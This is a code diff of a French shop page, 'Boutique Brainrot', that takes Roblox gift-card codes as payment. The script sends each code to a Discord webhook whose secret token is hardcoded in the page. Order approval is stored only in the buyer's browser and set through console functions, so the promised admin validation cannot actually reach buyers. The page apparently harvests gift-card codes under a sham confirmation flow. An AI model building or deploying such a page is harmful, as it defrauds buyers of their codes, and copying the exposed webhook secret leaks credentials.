@@ -1,563 +1,439 @@
 <!DOCTYPE html>
 <html lang="fr">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Boutique</title>
-    <style>
-        * { 
-            margin: 0; 
-            padding: 0; 
-            box-sizing: border-box; 
-        }
-        
-        body { 
-            font-family: sans-serif; 
-            background: #fafafa; 
-            color: #333;
-            perspective: 1500px;
-            min-height: 100vh;
-            display: flex;
-            flex-direction: column;
-            overflow-x: auto;
-            overflow-y: auto;
-        }
+	<meta charset="UTF-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1.0">
+	<title>Boutique Brainrot</title>
+	<style>
+		* {
+			margin: 0;
+			padding: 0;
+			box-sizing: border-box;
+		}
 
-        ::-webkit-scrollbar {
-            width: 12px;
-            height: 12px;
-        }
+		body {
+			font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+			background: #f5f5f5;
+			color: #333;
+			min-height: 100vh;
+			display: flex;
+			flex-direction: column;
+		}
 
-        ::-webkit-scrollbar-track {
-            background: #f1f1f1;
-            border-radius: 10px;
-        }
+		.navbar {
+			background: #fff;
+			padding: 20px 40px;
+			box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+		}
 
-        ::-webkit-scrollbar-thumb {
-            background: #888;
-            border-radius: 10px;
-        }
+		.navbar h1 {
+			font-size: 28px;
+			color: #2c3e50;
+		}
 
-        ::-webkit-scrollbar-thumb:hover {
-            background: #555;
-        }
-        
-        .navbar { 
-            background: #fff; 
-            padding: 20px; 
-            border-bottom: 1px solid #eee;
-            transform-style: preserve-3d;
-            animation: slideDown 0.6s cubic-bezier(0.4, 0, 0.2, 1);
-            box-shadow: 0 2px 10px rgba(0,0,0,0.05);
-        }
+		.container {
+			max-width: 1400px;
+			margin: 40px auto;
+			padding: 20px;
+			flex: 1;
+		}
 
-        @keyframes slideDown {
-            from { 
-                transform: translateY(-100%) rotateX(-10deg);
-                opacity: 0; 
-            }
-            to { 
-                transform: translateY(0) rotateX(0);
-                opacity: 1; 
-            }
-        }
+		#products-grid {
+			display: grid;
+			grid-template-columns: repeat(auto-fill, minmax(280px, 1fr));
+			gap: 30px;
+		}
 
-        .navbar h1 {
-            text-align: left;
-            font-size: 2em;
-            transform: translateZ(20px);
-        }
-        
-        .container { 
-            width: 100%;
-            margin: 40px auto; 
-            padding: 20px;
-            flex: 1;
-        }
-        
-        #products-grid { 
-            display: grid; 
-            grid-template-columns: repeat(auto-fill, minmax(280px, 280px)); 
-            gap: 25px;
-            justify-content: start;
-        }
+		.card {
+			background: #fff;
+			border-radius: 12px;
+			overflow: hidden;
+			box-shadow: 0 4px 15px rgba(0,0,0,0.1);
+			transition: transform 0.3s, box-shadow 0.3s;
+		}
 
-        .card {
-            width: 280px;
-            background: #fff; 
-            border: 1px solid #eee; 
-            padding: 15px; 
-            border-radius: 8px;
-            transform-style: preserve-3d;
-            transition: all 0.4s cubic-bezier(0.4, 0, 0.2, 1);
-            animation: fadeInUp 0.6s ease-out backwards;
-            position: relative;
-            overflow: hidden;
-        }
+		.card:hover {
+			transform: translateY(-5px);
+			box-shadow: 0 8px 25px rgba(0,0,0,0.15);
+		}
 
-        @keyframes fadeInUp {
-            from { 
-                opacity: 0; 
-                transform: translateY(50px) translateZ(-30px) rotateX(-8deg);
-            }
-            to { 
-                opacity: 1; 
-                transform: translateY(0) translateZ(0) rotateX(0);
-            }
-        }
+		.img-box {
+			width: 100%;
+			height: 200px;
+			background: #f0f0f0;
+			overflow: hidden;
+		}
 
-        .card::before {
-            content: '';
-            position: absolute;
-            top: -50%;
-            left: -50%;
-            width: 200%;
-            height: 200%;
-            background: linear-gradient(
-                45deg,
-                transparent,
-                rgba(255,255,255,0.5),
-                transparent
-            );
-            transform: rotate(45deg);
-            transition: all 0.6s;
-        }
+		.img-box img {
+			width: 100%;
+			height: 100%;
+			object-fit: cover;
+		}
 
-        .card:hover::before {
-            left: 100%;
-        }
+		.card-content {
+			padding: 20px;
+		}
 
-        .card:hover {
-            transform: translateY(-15px) translateZ(40px) rotateX(3deg);
-            box-shadow: 
-                0 25px 50px rgba(0,0,0,0.15),
-                0 10px 20px rgba(0,0,0,0.1);
-            border-color: #ddd;
-        }
+		.card h3 {
+			font-size: 20px;
+			margin-bottom: 10px;
+			color: #2c3e50;
+		}
 
-        .img-box { 
-            width: 100%; 
-            height: 150px; 
-            background: #f4f4f4; 
-            margin-bottom: 10px;
-            border-radius: 5px;
-            overflow: hidden;
-            transform-style: preserve-3d;
-        }
-        
-        .img-box img { 
-            width: 100%; 
-            height: 100%; 
-            object-fit: cover;
-            transition: transform 0.6s cubic-bezier(0.4, 0, 0.2, 1);
-        }
+		.card .description {
+			color: #7f8c8d;
+			font-size: 14px;
+			margin-bottom: 15px;
+		}
 
-        .card:hover .img-box img {
-            transform: scale(1.15) translateZ(15px);
-        }
+		.card .price {
+			font-size: 24px;
+			font-weight: bold;
+			color: #27ae60;
+			margin-bottom: 15px;
+		}
 
-        .card h3 {
-            font-size: 1.2em;
-            margin-bottom: 8px;
-            text-align: left;
-        }
+		.btn-buy {
+			width: 100%;
+			padding: 12px;
+			background: #3498db;
+			color: #fff;
+			border: none;
+			border-radius: 8px;
+			font-size: 16px;
+			font-weight: bold;
+			cursor: pointer;
+			transition: background 0.3s;
+		}
 
-        .card p {
-            font-size: 1.1em;
-            font-weight: bold;
-            margin: 10px 0;
-            text-align: left;
-        }
+		.btn-buy:hover {
+			background: #2980b9;
+		}
 
-        .btn-buy { 
-            width: 100%; 
-            padding: 10px; 
-            background: #000; 
-            color: #fff; 
-            border: none; 
-            cursor: pointer; 
-            font-weight: bold;
-            border-radius: 5px;
-            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
-            transform-style: preserve-3d;
-            box-shadow: 
-                0 6px 0 #333,
-                0 8px 15px rgba(0,0,0,0.2);
-            position: relative;
-            overflow: hidden;
-        }
+		.btn-buy:disabled {
+			background: #95a5a6;
+			cursor: not-allowed;
+		}
 
-        .btn-buy::before {
-            content: '';
-            position: absolute;
-            top: 50%;
-            left: 50%;
-            width: 0;
-            height: 0;
-            border-radius: 50%;
-            background: rgba(255,255,255,0.2);
-            transform: translate(-50%, -50%);
-            transition: width 0.6s, height 0.6s;
-        }
+		.sold-badge {
+			position: absolute;
+			top: 15px;
+			right: 15px;
+			background: #e74c3c;
+			color: white;
+			padding: 8px 16px;
+			border-radius: 20px;
+			font-size: 12px;
+			font-weight: bold;
+		}
 
-        .btn-buy:hover::before {
-            width: 300px;
-            height: 300px;
-        }
+		.modal {
+			display: none;
+			position: fixed;
+			top: 0;
+			left: 0;
+			width: 100%;
+			height: 100%;
+			background: rgba(0,0,0,0.7);
+			align-items: center;
+			justify-content: center;
+			z-index: 1000;
+		}
 
-        .btn-buy:hover {
-            transform: translateY(-3px) translateZ(10px);
-            box-shadow: 
-                0 9px 0 #333,
-                0 12px 25px rgba(0,0,0,0.3);
-        }
+		.modal-content {
+			background: #fff;
+			padding: 40px;
+			border-radius: 16px;
+			max-width: 450px;
+			width: 90%;
+			box-shadow: 0 10px 40px rgba(0,0,0,0.3);
+			position: relative;
+		}
 
-        .btn-buy:active {
-            transform: translateY(3px) translateZ(5px);
-            box-shadow: 
-                0 3px 0 #333,
-                0 4px 10px rgba(0,0,0,0.2);
-        }
+		.modal-content h2 {
+			margin-bottom: 10px;
+			color: #2c3e50;
+		}
 
-        .btn-buy:disabled {
-            opacity: 0.5;
-            cursor: not-allowed;
-            transform: none;
-            box-shadow: none;
-        }
+		.modal-content p {
+			color: #7f8c8d;
+			margin-bottom: 20px;
+		}
 
-        .discord-link { 
-            display: inline-block; 
-            background: #5865F2; 
-            color: white; 
-            padding: 15px 30px; 
-            text-decoration: none; 
-            font-weight: bold;
-            border-radius: 5px;
-            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
-            transform-style: preserve-3d;
-            box-shadow: 
-                0 8px 0 #3b44a3,
-                0 10px 25px rgba(88, 101, 242, 0.4);
-        }
+		.modal-content input {
+			width: 100%;
+			padding: 12px;
+			border: 2px solid #ddd;
+			border-radius: 8px;
+			font-size: 16px;
+			margin-bottom: 20px;
+		}
 
-        .discord-link:hover {
-            transform: translateY(-3px) translateZ(15px);
-            box-shadow: 
-                0 11px 0 #3b44a3,
-                0 13px 30px rgba(88, 101, 242, 0.5);
-        }
+		.modal-content input:focus {
+			outline: none;
+			border-color: #3498db;
+		}
 
-        .discord-link:active {
-            transform: translateY(5px) translateZ(5px);
-            box-shadow: 
-                0 3px 0 #3b44a3,
-                0 5px 15px rgba(88, 101, 242, 0.3);
-        }
+		.close-btn {
+			position: absolute;
+			top: 15px;
+			right: 15px;
+			background: none;
+			border: none;
+			font-size: 28px;
+			color: #95a5a6;
+			cursor: pointer;
+			line-height: 1;
+		}
 
-        .modal { 
-            display: none; 
-            position: fixed; 
-            top: 0; left: 0; 
-            width: 100%; height: 100%; 
-            background: rgba(0,0,0,0.8); 
-            align-items: center; 
-            justify-content: center;
-            z-index: 1000;
-            perspective: 1000px;
-            animation: fadeIn 0.3s ease;
-        }
+		.close-btn:hover {
+			color: #e74c3c;
+		}
 
-        @keyframes fadeIn {
-            from { opacity: 0; }
-            to { opacity: 1; }
-        }
+		.spinner {
+			border: 3px solid #f3f3f3;
+			border-top: 3px solid #3498db;
+			border-radius: 50%;
+			width: 40px;
+			height: 40px;
+			animation: spin 1s linear infinite;
+			margin: 20px auto;
+			display: none;
+		}
 
-        .modal-content { 
-            background: #fff; 
-            padding: 30px; 
-            max-width: 400px; 
-            width: 90%; 
-            text-align: center;
-            border-radius: 10px;
-            transform-style: preserve-3d;
-            animation: slideUp 0.5s cubic-bezier(0.4, 0, 0.2, 1);
-            box-shadow: 
-                0 25px 60px rgba(0,0,0,0.4),
-                0 10px 30px rgba(0,0,0,0.3);
-            position: relative;
-        }
+		@keyframes spin {
+			0% { transform: rotate(0deg); }
+			100% { transform: rotate(360deg); }
+		}
 
-        @keyframes slideUp {
-            from { 
-                transform: translateY(80px) translateZ(-50px) rotateX(-12deg);
-                opacity: 0;
-            }
-            to { 
-                transform: translateY(0) translateZ(0) rotateX(0);
-                opacity: 1;
-            }
-        }
+		.status-message {
+			position: fixed;
+			top: 20px;
+			right: 20px;
+			padding: 20px 30px;
+			border-radius: 12px;
+			box-shadow: 0 5px 20px rgba(0,0,0,0.2);
+			font-weight: bold;
+			z-index: 2000;
+			display: none;
+			animation: slideIn 0.3s ease;
+		}
 
-        .modal-content h2 {
-            margin-bottom: 20px;
-            font-size: 1.5em;
-        }
+		@keyframes slideIn {
+			from {
+				transform: translateX(400px);
+				opacity: 0;
+			}
+			to {
+				transform: translateX(0);
+				opacity: 1;
+			}
+		}
 
-        .modal-content p {
-            margin-bottom: 15px;
-            color: #666;
-        }
+		.status-success {
+			background: #2ecc71;
+			color: white;
+		}
 
-        input { 
-            width: 100%; 
-            padding: 10px; 
-            margin: 15px 0; 
-            border: 1px solid #ddd;
-            border-radius: 5px;
-            font-size: 1em;
-            transition: all 0.3s;
-        }
+		.status-error {
+			background: #e74c3c;
+			color: white;
+		}
 
-        input:focus {
-            outline: none;
-            border-color: #000;
-            box-shadow: 0 0 0 3px rgba(0,0,0,0.1);
-            transform: translateY(-2px);
-        }
-
-        .close-btn {
-            position: absolute;
-            top: 15px;
-            right: 15px;
-            background: #f0f0f0;
-            border: none;
-            font-size: 1.5em;
-            cursor: pointer;
-            color: #999;
-            width: 35px;
-            height: 35px;
-            border-radius: 50%;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            transition: background 0.3s, color 0.3s;
-        }
-
-        .close-btn:hover {
-            background: #e0e0e0;
-            color: #333;
-        }
-
-        .sold-badge {
-            position: absolute;
-            top: 15px;
-            right: 15px;
-            background: #ff4757;
-            color: white;
-            padding: 5px 15px;
-            border-radius: 20px;
-            font-size: 0.8em;
-            font-weight: bold;
-            animation: pulse 2s infinite;
-            box-shadow: 0 3px 10px rgba(255, 71, 87, 0.4);
-        }
-
-        @keyframes pulse {
-            0%, 100% { 
-                transform: scale(1) translateZ(5px); 
-            }
-            50% { 
-                transform: scale(1.05) translateZ(10px); 
-            }
-        }
-
-        .spinner {
-            border: 3px solid #f3f3f3;
-            border-top: 3px solid #000;
-            border-radius: 50%;
-            width: 40px;
-            height: 40px;
-            animation: spin 1s linear infinite;
-            margin: 20px auto;
-            display: none;
-        }
-
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
-
-        footer {
-            padding: 30px 50px;
-            text-align: left;
-            margin-top: auto;
-        }
-    </style>
+		.status-pending {
+			background: #f39c12;
+			color: white;
+		}
+	</style>
 </head>
 <body>
 
-    <nav class="navbar"><h1>Boutique Brainrot</h1></nav>
-    
-    <div class="container">
-        <div id="products-grid"></div>
-    </div>
+	<nav class="navbar">
+		<h1>Boutique Brainrot</h1>
+	</nav>
 
-    <footer>
-        <a href="https://discord.gg/893smJm6" class="discord-link">Discord</a>
-    </footer>
+	<div class="container">
+		<div id="products-grid"></div>
+	</div>
 
-    <div id="modal-pay" class="modal">
-        <div class="modal-content">
-            <button class="close-btn" onclick="closeModal('modal-pay')">×</button>
-            <h2 id="target-item">Paiement</h2>
-            <p id="code-instruction" style="color: #666; margin-bottom: 15px; font-weight: bold;">Code carte cadeau Roblox de X EUR</p>
-            <p style="color: #999; font-size: 0.9em; margin-bottom: 15px;">Après validation, un admin Discord répondra au message du bot</p>
-            <input type="text" id="code-input" placeholder="Code carte cadeau Roblox">
-            <div class="spinner" id="spinner"></div>
-            <button class="btn-buy" onclick="submitPayment()">Valider</button>
-        </div>
-    </div>
+	<div id="modal-pay" class="modal">
+		<div class="modal-content">
+			<button class="close-btn" onclick="closeModal()">×</button>
+			<h2 id="product-name">Paiement</h2>
+			<p id="product-price">Prix: 0 EUR</p>
+			<p style="font-size: 14px;">Entrez votre code carte cadeau Roblox</p>
+			<input type="text" id="code-input" placeholder="Code Roblox">
+			<div class="spinner" id="spinner"></div>
+			<button class="btn-buy" onclick="submitPayment()">Valider</button>
+		</div>
+	</div>
+
+	<div id="status-message" class="status-message"></div>
 
 	<script>
 		const WEBHOOK_URL = "https://discord.com/api/webhooks/1466863288552788125/jJmbTk9-imPHe4apZ8sTs0AWJZgi4tUltEdC14qMgaAJKPkB01VRMvJ2-ARXQa21dScq";
-		let currentItem = "";
-		let currentPrice = "";
 		let products = [];
+		let currentProduct = null;
 
-		// Charger les produits depuis products.json
+		// Charger les produits
 		async function loadProducts() {
 			try {
 				const response = await fetch('products.json');
 				products = await response.json();
-				init();
+				displayProducts();
 			} catch (error) {
-				// Silence - pas de message d'erreur visible
+				console.error('Erreur chargement produits');
 			}
 		}
 
-		function init() {
+		// Afficher les produits
+		function displayProducts() {
 			const grid = document.getElementById('products-grid');
 			const sold = JSON.parse(localStorage.getItem('sold_items') || "[]");
 
-			grid.innerHTML = products.map((p, index) => `
-				<div class="card" style="animation-delay: ${(index + 1) * 0.1}s;">
+			grid.innerHTML = products.map(p => `
+				<div class="card" style="position: relative;">
 					${sold.includes(p.title) ? '<div class="sold-badge">VENDU</div>' : ''}
 					<div class="img-box">
-						<img src="images/${p.image}" alt="${p.title}" onerror="this.src='data:image/svg+xml,%3Csvg xmlns=%22http://www.w3.org/2000/svg%22 width=%22200%22 height=%22150%22%3E%3Crect fill=%22%23f4f4f4%22 width=%22200%22 height=%22150%22/%3E%3Ctext x=%2250%25%22 y=%2250%25%22 font-size=%2218%22 text-anchor=%22middle%22 dy=%22.3em%22 fill=%22%23999%22%3E${p.title}%3C/text%3E%3C/svg%3E'">
+						<img src="images/${p.image}" alt="${p.title}" 
+							onerror="this.src='data:image/svg+xml,%3Csvg xmlns=%22http://www.w3.org/2000/svg%22 width=%22200%22 height=%22200%22%3E%3Crect fill=%22%23f0f0f0%22 width=%22200%22 height=%22200%22/%3E%3Ctext x=%2250%25%22 y=%2250%25%22 font-size=%2218%22 text-anchor=%22middle%22 dy=%22.3em%22 fill=%22%23999%22%3EImage%3C/text%3E%3C/svg%3E'">
 					</div>
-					<h3>${p.title}</h3>
-					<p style="color: #666; font-size: 0.9em; font-weight: normal; margin: 8px 0;">${p.description}</p>
-					<p>${p.price} EUR</p>
-					<button class="btn-buy" onclick="openPay('${p.title.replace(/'/g, "\\'")}', '${p.price}')" ${sold.includes(p.title) ? 'disabled' : ''}>
-						${sold.includes(p.title) ? 'VENDU' : 'ACHETER'}
-					</button>
+					<div class="card-content">
+						<h3>${p.title}</h3>
+						<p class="description">${p.description}</p>
+						<p class="price">${p.price} EUR</p>
+						<button class="btn-buy" onclick='openPayment(${JSON.stringify(p)})' ${sold.includes(p.title) ? 'disabled' : ''}>
+							${sold.includes(p.title) ? 'VENDU' : 'ACHETER'}
+						</button>
+					</div>
 				</div>
 			`).join('');
 		}
 
-		function openPay(title, price) {
-			currentItem = title;
-			currentPrice = price;
-			document.getElementById('target-item').innerText = title + ' - ' + price + ' EUR';
-			document.getElementById('code-instruction').innerText = 'Code carte cadeau Roblox de ' + price + ' EUR';
+		// Ouvrir le modal de paiement
+		function openPayment(product) {
+			currentProduct = product;
+			document.getElementById('product-name').textContent = product.title;
+			document.getElementById('product-price').textContent = 'Prix: ' + product.price + ' EUR';
 			document.getElementById('code-input').value = '';
 			document.getElementById('modal-pay').style.display = 'flex';
 			setTimeout(() => document.getElementById('code-input').focus(), 100);
 		}
 
-		function closeModal(modalId) {
-			document.getElementById(modalId).style.display = 'none';
+		// Fermer le modal
+		function closeModal() {
+			document.getElementById('modal-pay').style.display = 'none';
 		}
 
+		// Afficher un message de statut
+		function showStatus(message, type) {
+			const statusDiv = document.getElementById('status-message');
+			statusDiv.textContent = message;
+			statusDiv.className = 'status-message status-' + type;
+			statusDiv.style.display = 'block';
+
+			setTimeout(() => {
+				statusDiv.style.display = 'none';
+			}, 5000);
+		}
+
+		// Soumettre le paiement
 		async function submitPayment() {
-			const val = document.getElementById('code-input').value;
-			if(!val) {
+			const code = document.getElementById('code-input').value.trim();
+
+			if (!code) {
 				alert('Veuillez entrer un code');
 				return;
 			}
 
-			// Générer un ID unique pour cette commande
 			const orderId = Date.now();
-
 			document.getElementById('spinner').style.display = 'block';
 
-			// Sauvegarder la commande en attente
+			// Sauvegarder la commande
 			let pending = JSON.parse(localStorage.getItem('pending_orders') || "{}");
 			pending[orderId] = {
-				product: currentItem,
-				price: currentPrice,
-				code: val,
+				product: currentProduct.title,
+				price: currentProduct.price,
+				code: code,
 				status: 'pending',
 				timestamp: new Date().toISOString()
 			};
 			localStorage.setItem('pending_orders', JSON.stringify(pending));
 
-			// Envoi Discord avec instructions claires
+			// Envoyer sur Discord
 			try {
 				await fetch(WEBHOOK_URL, {
 					method: 'POST',
 					headers: {'Content-Type': 'application/json'},
-					body: JSON.stringify({ 
-						content: "🛒 **NOUVELLE DEMANDE D'ACHAT**\n" +
-								"📦 Produit: **" + currentItem + "**\n" +
-								"💰 Prix: **" + currentPrice + " EUR**\n" +
-								"🔑 Code Roblox: **" + val + "**\n" +
-								"🆔 ID Commande: **" + orderId + "**\n" +
-								"⏰ Date: **" + new Date().toLocaleString('fr-FR') + "**\n\n" +
-								"**⚠️ IMPORTANT: Pour valider cette commande, répondez directement à ce message avec:**\n" +
-								"✅ Pour accepter: `O " + orderId + "`\n" +
-								"❌ Pour refuser: `N " + orderId + "`"
+					body: JSON.stringify({
+						content: 
+							"NOUVELLE COMMANDE\n" +
+							"ID: " + orderId + "\n" +
+							"Produit: " + currentProduct.title + "\n" +
+							"Prix: " + currentProduct.price + " EUR\n" +
+							"Code Roblox: " + code + "\n" +
+							"Date: " + new Date().toLocaleString('fr-FR') + "\n\n" +
+							"Repondez a ce message avec:\n" +
+							"O " + orderId + " pour accepter\n" +
+							"N " + orderId + " pour refuser"
 					})
 				});
 
 				document.getElementById('spinner').style.display = 'none';
-				document.getElementById('modal-pay').style.display = 'none';
-				
-				alert('Demande envoyée! En attente de validation par un admin Discord...');
-				
-				// Vérifier périodiquement si la commande a été validée
+				closeModal();
+				showStatus('Demande envoyee! En attente de validation...', 'pending');
 				checkOrderStatus(orderId);
-				
+
 			} catch (error) {
 				document.getElementById('spinner').style.display = 'none';
-				alert('Erreur lors de l\'envoi. Veuillez réessayer.');
+				showStatus('Erreur lors de l\'envoi', 'error');
 			}
 		}
 
+		// Vérifier le statut de la commande
 		function checkOrderStatus(orderId) {
 			const interval = setInterval(() => {
 				let pending = JSON.parse(localStorage.getItem('pending_orders') || "{}");
-				
-				if(pending[orderId] && pending[orderId].status === 'approved') {
+
+				if (pending[orderId] && pending[orderId].status === 'approved') {
 					clearInterval(interval);
-					// Enlever de la boutique et rediriger
+
+					// Marquer comme vendu
 					let sold = JSON.parse(localStorage.getItem('sold_items') || "[]");
 					sold.push(pending[orderId].product);
 					localStorage.setItem('sold_items', JSON.stringify(sold));
+
 					delete pending[orderId];
 					localStorage.setItem('pending_orders', JSON.stringify(pending));
-					alert('✅ Achat validé! Redirection vers Discord...');
-					window.location.href = "https://discord.gg/893smJm6";
-				} else if(pending[orderId] && pending[orderId].status === 'rejected') {
+
+					showStatus('PAIEMENT EFFECTUE! Achat valide.', 'success');
+					displayProducts();
+
+					setTimeout(() => {
+						window.location.href = "https://discord.gg/893smJm6";
+					}, 3000);
+
+				} else if (pending[orderId] && pending[orderId].status === 'rejected') {
 					clearInterval(interval);
+
 					delete pending[orderId];
 					localStorage.setItem('pending_orders', JSON.stringify(pending));
-					alert('❌ Achat refusé par l\'administrateur');
-					init(); // Rafraîchir l'affichage
+
+					showStatus('Commande refusee. Code invalide.', 'error');
+					displayProducts();
 				}
-			}, 2000); // Vérifier toutes les 2 secondes
-			
-			// Arrêter après 10 minutes
+			}, 2000);
+
 			setTimeout(() => clearInterval(interval), 600000);
 		}
 
-		// API pour approuver/rejeter depuis Discord
+		// API pour valider depuis la console
 		window.approveOrder = function(orderId) {
 			let pending = JSON.parse(localStorage.getItem('pending_orders') || "{}");
-			if(pending[orderId]) {
+			if (pending[orderId]) {
 				pending[orderId].status = 'approved';
 				localStorage.setItem('pending_orders', JSON.stringify(pending));
+				console.log('Commande acceptee');
 				return true;
 			}
 			return false;
@@ -565,28 +441,30 @@
 
 		window.rejectOrder = function(orderId) {
 			let pending = JSON.parse(localStorage.getItem('pending_orders') || "{}");
-			if(pending[orderId]) {
+			if (pending[orderId]) {
 				pending[orderId].status = 'rejected';
 				localStorage.setItem('pending_orders', JSON.stringify(pending));
+				console.log('Commande refusee');
 				return true;
 			}
 			return false;
 		};
 
-		// Gestion touches
-		document.addEventListener('DOMContentLoaded', function() {
-			document.getElementById('code-input').addEventListener('keypress', function(e) {
-				if(e.key === 'Enter') submitPayment();
-			});
-
-			document.querySelectorAll('.modal').forEach(modal => {
-				modal.addEventListener('click', function(e) {
-					if(e.target === modal) modal.style.display = 'none';
-				});
-			});
-
+		// Démarrage
+		document.addEventListener('DOMContentLoaded', () => {
 			loadProducts();
+
+			// Enter pour valider
+			document.getElementById('code-input').addEventListener('keypress', (e) => {
+				if (e.key === 'Enter') submitPayment();
+			});
+
+			// Clic en dehors du modal pour fermer
+			document.getElementById('modal-pay').addEventListener('click', (e) => {
+				if (e.target.id === 'modal-pay') closeModal();
+			});
 		});
 	</script>
+
 </body>
 </html>
